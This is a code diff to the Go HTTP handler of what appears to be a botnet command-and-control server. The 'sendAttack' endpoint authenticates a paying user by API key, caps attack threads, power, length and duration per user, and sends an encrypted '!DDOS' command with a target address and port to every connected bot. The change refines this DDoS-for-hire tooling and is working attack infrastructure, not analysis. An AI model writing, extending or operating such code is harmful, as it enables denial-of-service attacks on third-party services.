@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"strconv"
 	"strings"
 )
 
@@ -40,10 +41,67 @@ func sendAttack(w http.ResponseWriter, r *http.Request) {
 		length = "50"
 	}
 
-	if !utils.StringInList(utils.ApiKeys, api_key) {
+	// convert everything to int
+	i_threads, err := strconv.Atoi(threads)
+	if utils.HandleError(err) {
+		w.WriteHeader(http.StatusBadRequest)
+		io.WriteString(w, "invalid args threads: int")
+		return
+	}
+
+	i_power, err := strconv.Atoi(power)
+	if utils.HandleError(err) {
+		w.WriteHeader(http.StatusBadRequest)
+		io.WriteString(w, "invalid args power: int")
+		return
+	}
+
+	i_length, err := strconv.Atoi(length)
+	if utils.HandleError(err) {
+		w.WriteHeader(http.StatusBadRequest)
+		io.WriteString(w, "invalid args length: int")
+		return
+	}
+
+	i_time, err := strconv.Atoi(time)
+	if utils.HandleError(err) {
+		w.WriteHeader(http.StatusBadRequest)
+		io.WriteString(w, "invalid args time: int")
+		return
+	}
+
+	// auth
+	sender := utils.User{
+		Username: "",
+	}
+
+	for _, u := range utils.Users {
+		if u.ApiKey == api_key {
+			sender = u
+			break
+		}
+	}
+
+	if sender.Username == "" {
 		w.WriteHeader(http.StatusUnauthorized)
 		io.WriteString(w, "Invalid API key")
 		return
+	}
+
+	if i_threads >= sender.Thread {
+		i_threads = sender.Thread
+	}
+
+	if i_power >= sender.Power {
+		i_power = sender.Power
+	}
+
+	if i_length >= sender.Length {
+		i_length = sender.Length
+	}
+
+	if i_time >= sender.Time {
+		i_time = sender.Time
 	}
 
 	if !utils.StringInList(utils.Methods, method) {
@@ -53,21 +111,21 @@ func sendAttack(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.WriteHeader(http.StatusOK)
-	
+
 	// !method ip port time [thread] [power] [length]
 	success := 0
 	for _, bot := range socket.BotList {
 		if !bot.Auth {
 			continue
 		}
-		
-		if bot.Network.Send(security.EncryptStr(fmt.Sprintf("!DDOS %s %s %s %s %s %s %s", strings.ToUpper(method), address, port, time, threads, power, length))) {
+
+		if bot.Network.Send(security.EncryptStr(fmt.Sprintf("!DDOS %s %s %s %d %d %d %d", strings.ToUpper(method), address, port, i_time, i_threads, i_power, i_length))) {
 			success++
 		}
 	}
-	
+
 	//grafana.MethodCount.WithLabelValues(strings.ToUpper(method)).Add(1)
-	utils.Debug(fmt.Sprintf("[%s] [event=attack] [user=%s] [device=%d] [target=%s:%s] [method=%s] [time=%s] [threads=%s] [power=%s] [length=%s]", r.RemoteAddr, api_key, success, address, port, method, time, threads, power, length))
+	utils.Debug(fmt.Sprintf("[%s] [event=attack] [user=%s] [device=%d] [target=%s:%s] [method=%s] [time=%d] [threads=%d] [power=%d] [length=%d]", r.RemoteAddr, sender.Username, success, address, port, method, i_time, i_threads, i_power, i_length))
 	io.WriteString(w, fmt.Sprintf("attack distributed to %d bots", success))
 }
 
